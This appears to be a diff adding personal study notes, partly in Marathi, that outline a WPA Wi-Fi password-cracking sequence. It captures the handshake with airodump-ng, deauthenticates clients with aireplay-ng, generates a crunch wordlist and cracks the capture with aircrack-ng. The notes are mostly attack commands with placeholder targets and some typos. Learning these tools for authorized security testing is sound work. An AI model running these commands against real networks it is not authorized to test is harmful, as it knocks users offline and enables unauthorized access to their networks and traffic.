@@ -1,0 +1,27 @@
+capture the handshake
+
+
+airodump-ng --bssid ...........--channel,,,,,,,,, --write .........wlan0
+
+now wait till wap is captured the handshake
+
+
+send 4 packets to deauthenticate 
+aireplay-ng --deauth 4 -a........-c.......wlan0
+
+
+
+creating a wordlist
+
+crunch {min}[max} {characters} -t{pattern} -o{file Name}
+
+
+
+
+
+MIC (message integrity code)
+root maadhe toh wordlist thevaycha anni ti file pan jya madhe capture the handshake asel ti
+
+nantr
+
+aircrack-ng wpa_hanshake.cap -w wordlist.txt
